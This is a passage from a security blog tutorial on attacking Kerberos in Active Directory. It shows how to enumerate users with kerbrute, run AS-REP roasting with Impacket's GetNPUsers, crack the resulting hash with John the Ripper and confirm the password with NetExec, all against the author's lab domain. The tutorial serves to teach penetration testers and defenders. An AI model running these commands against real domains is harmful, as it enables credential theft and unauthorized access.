<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AD - Attacking Kerberos</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
    <link href="/css/articles.css" rel="stylesheet">
    <link href="/css/styles.css" rel="stylesheet">
    <link href="/css/monokai.css" rel="stylesheet">
    <link rel="icon" href="/favicon.ico" type="image/x-icon">
</head>
<body>
    <div class="container-fluid">
        <div class="row">
            <!-- Sidebar -->
            <aside class="sidebar">
                <div class="sidebar-logo">
                    <img src="/img/new-logo.png" alt="Logo">
                    <h3>elswix</h3>
                </div>
                <nav>
                    <ul class="nav flex-column">
                        <li class="nav-item"><a href="/" class="nav-link active"><i class="bi bi-house-door"></i> Home</a></li>
                        <li class="nav-item"><a href="/articles" class="nav-link"><i class="bi bi-card-text"></i> Articles</a></li>
                        <li class="nav-item"><a href="/writeups" class="nav-link"><i class="bi bi-terminal"></i> WriteUPs</a></li>
                        <li class="nav-item"><a href="/notes" class="nav-link"><i class="bi bi-journal-text"></i> Notes</a></li>
                        <li class="nav-item"><a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link"><i class="bi bi-github"></i> KL-Sunset</a></li>
                        <li class="nav-item"><a href="/about" class="nav-link"><i class="bi bi-person"></i> About me</a></li>
                    </ul>
                </nav>
            </aside>
            <!-- Main Content -->
            <main>
                <!-- Hero Section -->
                <section class="hero mb-5">
                    <img src="/img/articles/logo14.png" alt="index-logo" class="mb-3" style="width: 120px; height: 120px; border-radius: 50%">
                    <h2>Attacking Kerberos</h2>
                    <p>Diving into the most common attacks</p>
                </section>
                <section class="article-content">
                    <div class="article-container">
                        <div class="article-content-main">
                            <br/><h2>Introduction:</h2><br/>
<p>In previous articles, we discussed the Kerberos Authentication Protocol, which is crucial for understanding Active Directory environments. Additionally, we covered the theory behind some common attacks that exploit these concepts.</p><br/>
<p>Today, we'll explore the exploitation of an AD environment, demonstrating how to carry out these attacks and apply the Kerberos Authentication Protocol in real-world exploitation scenarios.</p><br/>
<br/><h2>Attacks</h2><br/>
<p>Today, we'll cover the exploitation of the most common attacks:</p><br/>
<ul>
<li>Kerberos Bruteforce (User Enumeration)</li>
<li>ASREP Roasting</li>
<li>Kerberoasting</li>
<li>OverpassTheHash/Pass The Key</li>
<li>PassTheTicket</li>
<li>Silver Ticket </li>
<li>Golden Ticket</li>
</ul><br/>
<p>The attacks are categorized based on the required privilege level, starting with the lowest. As such, the initial attacks only require network access to the DC (Domain Controller), which, in the case of Active Directory (AD), also functions as the KDC (Key Distribution Center). In contrast, the final attack necessitates Domain Administrator privileges or equivalent.</p><br/>
<h3 class="note">Note</h3><br/>
<p>Before continuing, I strongly recommend reading the previous article in which we introduced Kerberos, as it is essential for understanding the underlying processes behind these attacks.</p><br/>
<h3 class="note">Note (Execution from Windows)</h3><br/>
<p>In this section, we'll explain how the attacks work behind the scenes and how to exploit them remotely, i.e., through Linux. These attacks can also be exploited on Windows, which is why I've created a <a href="Windows-Abuse.html">separate section of this article</a> where we replicate these attacks. However, I highly recommend reading this section first, as in the Windows section, I focus only on the exploitation demonstration and do not explain how the attack works.</p><br/>
<br/><h2>Kerberos Brute Force (User Enumeration)</h2><br/>
<p>Initially, we'll demonstrate how to carry out the Kerberos brute force attack. This attack involves sending authentication requests with guessed usernames and analyzing the responses, as Kerberos returns different error messages for valid and invalid usernames.</p><br/>
<p>Remember the process we discussed earlier regarding the actions the AS performs before sending a <code>KRB_AS_REP</code>. When receiving a <code>KRB_AS_REQ</code>, we explained that the AS first verifies whether the specified user exists. If the user does not exist, the <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code> message is returned.</p><br/>
<p>This message is very useful to us, as it indicates whether the specified user exists or not, which is valuable for subsequent attacks.</p><br/>
<h3>Abuse</h3><br/>
<p>First, we need a list of usernames. We will use this list to iterate through each user and request a TGT for that user. If the <code>KDC</code> responds with <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>, it means the user does not exist. However, if the <code>KDC</code> replies with <code>KDC_ERR_PREAUTH_FAILED</code>, it indicates that the user is valid but the credentials are incorrect, which is useful because it confirms the user exists.</p><br/>
<p>Of course, performing this process manually can be tedious and time-consuming. Fortunately, there are many tools that automate this task. In this case, I’ll use <a href="https://github.com/ropnop/kerbrute">Kerbrute</a>, which is widely considered the most popular and effective tool for this purpose.</p><br/>
<p><strong>Instalation:</strong></p><br/>
<p>The installation of this tool is straightforward. There is a release binary available, but it is outdated. Therefore, the best way to install this tool is by cloning the repository.</p><br/>
<div class="highlight"><pre><span></span><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">ropnop</span><span class="o">/</span><span class="n">kerbrute</span>
<span class="n">cd</span> <span class="n">kerbrute</span>
<span class="n">go</span> <span class="n">build</span> <span class="o">-</span><span class="n">ldflags</span> <span class="s2">"-s -w"</span> <span class="o">.</span>
</pre></div>
<p>Now, you can simply copy the compiled binary to a directory in the PATH, allowing you to execute it from anywhere.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">kerbrute</span>

    <span class="n">__</span>             <span class="n">__</span>               <span class="n">__</span>     
   <span class="o">/</span> <span class="o">/</span><span class="n">_____</span>  <span class="n">_____</span><span class="o">/</span> <span class="o">/</span><span class="n">_</span>  <span class="n">_______</span>  <span class="n">__</span><span class="o">/</span> <span class="o">/</span><span class="n">____</span> 
  <span class="o">/</span> <span class="o">//</span><span class="n">_</span><span class="o">/</span> <span class="n">_</span> \<span class="o">/</span> <span class="n">___</span><span class="o">/</span> <span class="n">__</span> \<span class="o">/</span> <span class="n">___</span><span class="o">/</span> <span class="o">/</span> <span class="o">/</span> <span class="o">/</span> <span class="n">__</span><span class="o">/</span> <span class="n">_</span> \
 <span class="o">/</span> <span class="p">,</span><span class="o">&lt;</span> <span class="o">/</span>  <span class="n">__</span><span class="o">/</span> <span class="o">/</span>  <span class="o">/</span> <span class="o">/</span><span class="n">_</span><span class="o">/</span> <span class="o">/</span> <span class="o">/</span>  <span class="o">/</span> <span class="o">/</span><span class="n">_</span><span class="o">/</span> <span class="o">/</span> <span class="o">/</span><span class="n">_</span><span class="o">/</span>  <span class="n">__</span><span class="o">/</span>
<span class="o">/</span><span class="n">_</span><span class="o">/|</span><span class="n">_</span><span class="o">|</span>\<span class="n">___</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>  <span class="o">/</span><span class="n">_</span><span class="o">.</span><span class="n">___</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">/</span>\<span class="n">__</span><span class="o">/</span>\<span class="n">___</span><span class="o">/</span>                                        
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">Usage</span><span class="p">:</span>
  <span class="n">kerbrute</span> <span class="p">[</span><span class="n">command</span><span class="p">]</span>

<span class="n">Available</span> <span class="n">Commands</span><span class="p">:</span>
  <span class="n">bruteforce</span>    <span class="n">Bruteforce</span> <span class="n">username</span><span class="p">:</span><span class="n">password</span> <span class="n">combos</span><span class="p">,</span> <span class="kn">from</span> <span class="nn">a</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">stdin</span>
  <span class="n">bruteuser</span>     <span class="n">Bruteforce</span> <span class="n">a</span> <span class="n">single</span> <span class="n">user</span><span class="s1">'s password from a wordlist</span>
  <span class="n">help</span>          <span class="n">Help</span> <span class="n">about</span> <span class="nb">any</span> <span class="n">command</span>
  <span class="n">passwordspray</span> <span class="n">Test</span> <span class="n">a</span> <span class="n">single</span> <span class="n">password</span> <span class="n">against</span> <span class="n">a</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">users</span>
  <span class="n">userenum</span>      <span class="n">Enumerate</span> <span class="n">valid</span> <span class="n">domain</span> <span class="n">usernames</span> <span class="n">via</span> <span class="n">Kerberos</span>
  <span class="n">version</span>       <span class="n">Display</span> <span class="n">version</span> <span class="n">info</span> <span class="ow">and</span> <span class="n">quit</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="n">Use</span> <span class="s2">"kerbrute [command] --help"</span> <span class="k">for</span> <span class="n">more</span> <span class="n">information</span> <span class="n">about</span> <span class="n">a</span> <span class="n">command</span><span class="o">.</span>
</pre></div>
<p>The usage is straightforward. It offers several modes that can be helpful in different scenarios. In this case, we want to enumerate valid users by providing a wordlist, so we will use the <code>userenum</code> module.</p><br/>
<p>Next, we need to provide the following three parameters:</p><br/>
<ul>
<li><code>--dc</code>: The IP address of the KDC (in my lab, it is <code>192.168.100.1</code>)</li>
<li><code>-d</code>: The domain (in my lab, it is <code>elswixcorp.local</code>)</li>
<li><code>usersfile</code>: The wordlist containing the usernames to test. I will use this <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/Names/names.txt">names list</a> from <a href="https://github.com/danielmiessler/SecLists">Seclists</a> to execute the attack.</li>
</ul><br/>
<p>With this information, we can now run <code>Kerbrute</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">kerbrute</span> <span class="n">userenum</span> <span class="o">--</span><span class="n">dc</span> <span class="mf">192.168.100.1</span> <span class="o">-</span><span class="n">d</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Usernames</span><span class="o">/</span><span class="n">Names</span><span class="o">/</span><span class="n">names</span><span class="o">.</span><span class="n">txt</span>

    <span class="n">__</span>             <span class="n">__</span>               <span class="n">__</span>     
   <span class="o">/</span> <span class="o">/</span><span class="n">_____</span>  <span class="n">_____</span><span class="o">/</span> <span class="o">/</span><span class="n">_</span>  <span class="n">_______</span>  <span class="n">__</span><span class="o">/</span> <span class="o">/</span><span class="n">____</span> 
  <span class="o">/</span> <span class="o">//</span><span class="n">_</span><span class="o">/</span> <span class="n">_</span> \<span class="o">/</span> <span class="n">___</span><span class="o">/</span> <span class="n">__</span> \<span class="o">/</span> <span class="n">___</span><span class="o">/</span> <span class="o">/</span> <span class="o">/</span> <span class="o">/</span> <span class="n">__</span><span class="o">/</span> <span class="n">_</span> \
 <span class="o">/</span> <span class="p">,</span><span class="o">&lt;</span> <span class="o">/</span>  <span class="n">__</span><span class="o">/</span> <span class="o">/</span>  <span class="o">/</span> <span class="o">/</span><span class="n">_</span><span class="o">/</span> <span class="o">/</span> <span class="o">/</span>  <span class="o">/</span> <span class="o">/</span><span class="n">_</span><span class="o">/</span> <span class="o">/</span> <span class="o">/</span><span class="n">_</span><span class="o">/</span>  <span class="n">__</span><span class="o">/</span>
<span class="o">/</span><span class="n">_</span><span class="o">/|</span><span class="n">_</span><span class="o">|</span>\<span class="n">___</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>  <span class="o">/</span><span class="n">_</span><span class="o">.</span><span class="n">___</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">/</span>\<span class="n">__</span><span class="o">/</span>\<span class="n">___</span><span class="o">/</span>                                        

<span class="n">Version</span><span class="p">:</span> <span class="n">dev</span> <span class="p">(</span><span class="n">n</span><span class="o">/</span><span class="n">a</span><span class="p">)</span> <span class="o">-</span> <span class="mi">12</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">24</span> <span class="o">-</span> <span class="n">Ronnie</span> <span class="n">Flathers</span> <span class="nd">@ropnop</span>

<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">17</span> <span class="mi">15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">14</span> <span class="o">&gt;</span>  <span class="n">Using</span> <span class="n">KDC</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">17</span> <span class="mi">15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">14</span> <span class="o">&gt;</span>     <span class="mf">192.168.100.1</span><span class="p">:</span><span class="mi">88</span>

<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">17</span> <span class="mi">15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">14</span> <span class="o">&gt;</span>  <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="nd">VALID</span> <span class="nd">USERNAME</span><span class="nd">:</span>  <span class="nd">arthur</span><span class="nd">@elswixcorp</span><span class="nd">.</span><span class="nd">local</span>
<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">17</span> <span class="mi">15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">15</span> <span class="o">&gt;</span>  <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="nd">VALID</span> <span class="nd">USERNAME</span><span class="nd">:</span>  <span class="nd">ellie</span><span class="nd">@elswixcorp</span><span class="nd">.</span><span class="nd">local</span>
<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">17</span> <span class="mi">15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span> <span class="o">&gt;</span>  <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="nd">VALID</span> <span class="nd">USERNAME</span><span class="nd">:</span>  <span class="nd">jack</span><span class="nd">@elswixcorp</span><span class="nd">.</span><span class="nd">local</span>
<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">17</span> <span class="mi">15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span> <span class="o">&gt;</span>  <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="nd">VALID</span> <span class="nd">USERNAME</span><span class="nd">:</span>  <span class="nd">joaquin</span><span class="nd">@elswixcorp</span><span class="nd">.</span><span class="nd">local</span>
<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">17</span> <span class="mi">15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span> <span class="o">&gt;</span>  <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="nd">VALID</span> <span class="nd">USERNAME</span><span class="nd">:</span>  <span class="nd">joel</span><span class="nd">@elswixcorp</span><span class="nd">.</span><span class="nd">local</span>
<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">17</span> <span class="mi">15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">16</span> <span class="o">&gt;</span>  <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="nd">VALID</span> <span class="nd">USERNAME</span><span class="nd">:</span>  <span class="nd">john</span><span class="nd">@elswixcorp</span><span class="nd">.</span><span class="nd">local</span>
<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">17</span> <span class="mi">15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">18</span> <span class="o">&gt;</span>  <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="nd">VALID</span> <span class="nd">USERNAME</span><span class="nd">:</span>  <span class="nd">peter</span><span class="nd">@elswixcorp</span><span class="nd">.</span><span class="nd">local</span>
<span class="mi">2024</span><span class="o">/</span><span class="mi">12</span><span class="o">/</span><span class="mi">17</span> <span class="mi">15</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">23</span> <span class="o">&gt;</span>  <span class="n">Done</span><span class="n">!</span> <span class="n">Tested</span> <span class="mi">10177</span> <span class="n">usernames</span> <span class="p">(</span><span class="mi">7</span> <span class="n">valid</span><span class="p">)</span> <span class="ow">in</span> <span class="mf">8.926</span> <span class="n">seconds</span>
</pre></div>
<p>As observed, it detected seven valid users. This information is valuable for the following attack.</p><br/>
<br/><h2>AS-REP Roasting</h2><br/>
<p>In the previous article, we introduced this attack. However, let’s briefly revisit what it involves.</p><br/>
<p>This attack targets users who do not have Kerberos pre-authentication enabled, meaning their account has the <code>UF_DONT_REQUIRE_PREAUTH</code> attribute set.</p><br/>
<p>When an AS-REQ is sent for such a user, the KDC responds with a <code>KRB_AS_REP</code>, which contains the user’s encrypted data (a structure that includes the first Session Key). This data is encrypted using the user’s NT hash and can be brute-forced offline using a large password list to recover the hash—and potentially the password. Essentially, the attacker attempts to decrypt the structure containing the <code>Session Key</code>. If successful, this indicates that the correct user password has been obtained.</p><br/>
<p>An account with the <code>UF_DONT_REQUIRE_PREAUTH</code> attribute set means that pre-authentication information is not required to obtain a TGT for that account.</p><br/>
<p>As mentioned in the previous article, when sending a <code>KRB_AS_REQ</code> message to the KDC (the first step in the Kerberos Authentication Process), you must provide a structure containing a timestamp encrypted with the NT hash (user key) of the account:</p><br/>
<p><img src="https://elswix.github.io/articles/13/img/1.png"/></p><br/><p>Then, when the KDC receives this message, it looks for the corresponding NT hash of the specified <code>username</code> and attempts to decrypt the timestamp using that hash. If the decryption is successful, it means the timestamp was encrypted with the correct hash, i.e., with valid credentials for that user.</p><br/>
<p>The <code>UF_DONT_REQUIRE_PREAUTH</code> attribute allows a <code>KRB_AS_REQ</code> message to be sent for an account with this attribute set, without the need to provide pre-authentication information (i.e., without an encrypted timestamp):</p><br/>
<p><img alt="" src="https://elswix.github.io/articles/14/img/1.png"/></p><br/>
<p>Finally, the KDC issues a TGT without verifying whether the client requesting the TGT knows the credentials for the specified user.</p><br/>
<p><img src="https://elswix.github.io/articles/13/img/2.png"/></p><br/>
Finally, the client (who receives the <code>KRB_AS_REP</code> message) may attempt to crack the structure containing the session key, which is encrypted with the User Key (the user's NT hash). This can be done through a dictionary attack using tools such as John the Ripper or Hashcat.</p><br/>
<p>Why not try to reuse the TGT instead? Well, this isn't possible. Remember that to request a Service Ticket, you must send a <code>KRB_TGS_REQ</code> with a structure encrypted with the session key. Without having the user key beforehand, you cannot decrypt the structure containing the session key, which means you can't use that TGT.</p><br/>
<h3>Abuse</h3><br/>
<p>In order to execute this attack, valid credentials are not required, because, as explained above, pre-authentication information is not needed to obtain a TGT. However, you do need a list of valid users within the domain. You must then create a <code>KRB_AS_REQ</code> message for each user and send it to the KDC. If any of the requests result in a <code>KRB_AS_REP</code> reply, this indicates that the user specified in the <code>KRB_AS_REQ</code> has the <code>UF_DONT_REQ_PREAUTH</code> attribute set. This allows us to exploit an <strong>AS-REP Roasting</strong> attack by attempting to decrypt the structure in the <code>KRB_AS_REP</code> that contains the session key.</p><br/>
<p>Thanks to the previous attack, the <strong>Kerberos Brute Force</strong> attack, we have obtained a list of valid users within the Active Directory. Now, we can use this list to perform an AS-REP Roasting attack:</p><br/>
<div class="highlight"><pre><span></span><span class="n">arthur</span>
<span class="n">ellie</span>
<span class="n">jack</span>
<span class="n">joaquin</span>
<span class="n">joel</span>
<span class="n">john</span>
<span class="n">peter</span>
</pre></div>
<p>I will save these usernames to a file named <code>users.txt</code>.</p><br/>
<p>To automate the process for each user, we can use the <code>GetNPUsers.py</code> script from the <a href="https://github.com/fortra/impacket">Impacket</a> suite. You can install <code>Impacket</code> via <code>pip</code> from PyPI:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">pip</span> <span class="n">install</span> <span class="n">impacket</span>
</pre></div>
<p>Now, let's execute <code>GetNPUsers.py</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">GetNPUsers</span><span class="o">.</span><span class="n">py</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span> <span class="o">-</span><span class="n">usersfile</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.13.0</span><span class="o">.</span><span class="n">dev0</span><span class="o">+</span><span class="mf">20241024.85237</span><span class="o">.</span><span class="n">db71504</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">arthur</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">ellie</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">jack</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">joaquin</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">joel</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">User</span> <span class="n">john</span> <span class="n">doesn</span><span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
<span class="n">$</span><span class="n">krb5asrep</span><span class="n">$</span><span class="n">23</span><span class="n">$</span><span class="n">peter</span><span class="n">@ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span><span class="mi">3</span><span class="n">a20578cd7031d33115de2644edb73fc</span><span class="n">$</span><span class="n">e86d4cbf834f517bb5f234531699a2a6146ccbe8bf5f20e8f2bcd08d1b002ab4d78bd6ad1f8a83d81a3e8dd0c7596f158dea5d9d26cc3aebe8b6fcb73222d395569ebd8ef64b30ca94a8988093013380b9f18e5d68f6ca0dc63edc50c343fc7d3ff4262d1b627befaa0f4292f020c9bf022e085832ed4fd8f5f55099ceb2cb0e3b823b1f6531d9f5345326b0bf9002f5fb050c631b0dd270f1c3a571a845cfc59d2f0f512a24e3913cce9cda1e05b73c98287e944b1f3888e6ebbab2c3e0575caec8b79b8364a2537746f2e22084fa9725abefaa9c3a1dfed7643b360c81148d49193123e723e2f2fb31bdf926eb91e151b56952</span>
</pre></div>
<p>s observed, one of the users in the list has the <code>UF_DONT_REQUIRE_PREAUTH</code> attribute set. This allowed us to send a <code>KRB_AS_REQ</code> message to the KDC for the user <code>peter</code>, which responded with a <code>KRB_AS_REP</code> containing the TGT and the encrypted session key.</p><br/>
<p>Fortunately, the output we received from the <code>KRB_AS_REP</code> for <code>peter</code> is already in a format compatible with <code>john</code> for cracking.</p><br/>
<div class="highlight"><pre><span></span><span class="n">$</span><span class="n">krb5asrep</span><span class="n">$</span><span class="mi">23</span><span class="n">$</span><span class="n">peter</span><span class="n">@ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span><span class="mi">3</span><span class="n">a20578cd7031d33115de2644edb73fc</span><span class="n">$</span><span class="n">e86d4cbf834f517bb5f234531699a2a6146ccbe8bf5f20e8f2bcd08d1b002ab4d78bd6ad1f8a83d81a3e8dd0c7596f158dea5d9d26cc3aebe8b6fcb73222d395569ebd8ef64b30ca94a8988093013380b9f18e5d68f6ca0dc63edc50c343fc7d3ff4262d1b627befaa0f4292f020c9bf022e085832ed4fd8f5f55099ceb2cb0e3b823b1f6531d9f5345326b0bf9002f5fb050c631b0dd270f1c3a571a845cfc59d2f0f512a24e3913cce9cda1e05b73c98287e944b1f3888e6ebbab2c3e0575caec8b79b8364a2537746f2e22084fa9725abefaa9c3a1dfed7643b360c81148d49193123e723e2f2fb31bdf926eb91e151b56952</span>
</pre></div>
<p>This hash is essentially an encrypted structure containing the <strong>Session Key</strong>. Next, we will attempt to decrypt or crack it to retrieve the user's password.</p><br/>
<p>To crack this hash, I will use <code>rockyou.txt</code> as the password list. Let's proceed with the cracking process:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">john</span> <span class="o">-</span><span class="n">w</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Passwords</span><span class="o">/</span><span class="n">Leaked</span><span class="o">-</span><span class="n">Databases</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="n">hashfile</span>
<span class="n">Using</span> <span class="n">default</span> <span class="nb">input</span> <span class="n">encoding</span><span class="p">:</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Loaded</span> <span class="mi">1</span> <span class="n">password</span> <span class="nb">hash</span> <span class="p">(</span><span class="n">krb5asrep</span><span class="p">,</span> <span class="n">Kerberos</span> <span class="mi">5</span> <span class="n">AS</span><span class="o">-</span><span class="n">REP</span> <span class="n">etype</span> <span class="mi">17</span><span class="o">/</span><span class="mi">18</span><span class="o">/</span><span class="mi">23</span> <span class="p">[</span><span class="n">MD4</span> <span class="n">HMAC</span><span class="o">-</span><span class="n">MD5</span> <span class="n">RC4</span> <span class="o">/</span> <span class="n">PBKDF2</span> <span class="n">HMAC</span><span class="o">-</span><span class="n">SHA1</span> <span class="n">AES</span> <span class="mi">128</span><span class="o">/</span><span class="mi">128</span> <span class="n">AVX</span> <span class="mi">4</span><span class="n">x</span><span class="p">])</span>
<span class="n">Cost</span> <span class="mi">1</span> <span class="p">(</span><span class="n">etype</span><span class="p">)</span> <span class="ow">is</span> <span class="mi">23</span> <span class="k">for</span> <span class="nb">all</span> <span class="n">loaded</span> <span class="n">hashes</span>
<span class="n">Will</span> <span class="n">run</span> <span class="mi">4</span> <span class="n">OpenMP</span> <span class="n">threads</span>
<span class="n">Press</span> <span class="s1">'q'</span> <span class="ow">or</span> <span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span> <span class="n">to</span> <span class="n">abort</span><span class="p">,</span> <span class="s1">'h'</span> <span class="k">for</span> <span class="n">help</span><span class="p">,</span> <span class="n">almost</span> <span class="nb">any</span> <span class="n">other</span> <span class="n">key</span> <span class="k">for</span> <span class="n">status</span>

<span class="n">cr4ckthis4n</span><span class="n">!</span><span class="n">c</span><span class="o">%</span>   <span class="p">(</span><span class="n">$</span><span class="n">krb5asrep</span><span class="n">$</span><span class="mi">23</span><span class="n">$</span><span class="n">peter</span><span class="n">@ELSWIXCORP</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">)</span> 

<span class="mi">1</span><span class="n">g</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">12</span> <span class="n">DONE</span> <span class="p">(</span><span class="mi">2024</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">19</span> <span class="mi">19</span><span class="p">:</span><span class="mi">23</span><span class="p">)</span> <span class="mf">0.07794</span><span class="n">g</span><span class="o">/</span><span class="n">s</span> <span class="mi">696766</span><span class="n">p</span><span class="o">/</span><span class="n">s</span> <span class="mi">696766</span><span class="n">c</span><span class="o">/</span><span class="n">s</span> <span class="mi">696766</span><span class="n">C</span><span class="o">/</span><span class="n">s</span> <span class="n">cr8luv</span><span class="o">..</span><span class="n">cr31591</span>
<span class="n">Use</span> <span class="n">the</span> <span class="s2">"--show"</span> <span class="n">option</span> <span class="n">to</span> <span class="n">display</span> <span class="nb">all</span> <span class="n">of</span> <span class="n">the</span> <span class="n">cracked</span> <span class="n">passwords</span> <span class="n">reliably</span>
<span class="n">Session</span> <span class="n">completed</span><span class="o">.</span>
</pre></div>
<p>It worked! We successfully cracked the hash and retrieved Peter's password.</p><br/>
<p>Next, we can use <a href="https://github.com/Pennyw0rth/NetExec">NetExec</a> to verify the correctness of this password:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">nxc</span> <span class="n">smb</span> <span class="mf">192.168.100.1</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'peter'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'cr4ckthis4n!c%'</span>
<span class="ow">SMB</span>         <span class="mf">192.168.100.1</span>   <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2022</span> <span class="n">Build</span> <span class="mi">20348</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="ow">SMB</span>         <span class="mf">192.168.100.1</span>   <span class="mi">445</span>    <span class="n">DC01</span>             <span class="nd">[</span><span class="nd">+</span><span class="nd">]</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span>\<span class="n">peter</span><span class="p">:</span><span class="n">cr4ckthis4n</span><span class="n">!</span><span class="n">c</span><span class="o">%</span>
</pre></div>
<p>And, of course, it's correct.</p><br/>
<h3 class="note">Note</h3><br/>
